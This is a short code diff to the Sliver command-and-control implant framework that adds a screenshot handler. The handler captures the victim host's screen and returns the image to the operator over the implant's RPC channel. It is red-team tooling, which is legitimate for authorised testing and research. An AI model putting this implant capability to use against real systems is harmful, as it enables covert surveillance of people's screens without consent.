@@ -49,6 +49,8 @@ import (
 	"github.com/bishopfox/sliver/sliver/procdump"
 	"github.com/bishopfox/sliver/sliver/ps"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
+	screen "github.com/bishopfox/sliver/sliver/sc"
+
 
 	"github.com/golang/protobuf/proto"
 )
@@ -504,6 +506,27 @@ func executeHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+
+func screenshotHandler(data []byte, resp RPCResponse) {
+	sc := &pb.Screenshot{}
+	err := proto.Unmarshal(data, sc)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	// {{if .Debug}}
+	log.Printf("Screenshot Request")
+	// {{end}}
+
+
+	sc.Data = screen.Capture()
+	data, err = proto.Marshal(sc)
+
+	resp(data, err)
+}
+
 func netstatHandler(data []byte, resp RPCResponse) {
 	netstatReq := &pb.NetstatRequest{}
 	err := proto.Unmarshal(data, netstatReq)
@@ -610,6 +633,7 @@ func buildEntries(proto string, s []netstat.SockTabEntry) []*pb.SockTabEntry {
 		})
 	}
 	return entries
+
 }
 
 // ---------------- Data Encoders ----------------
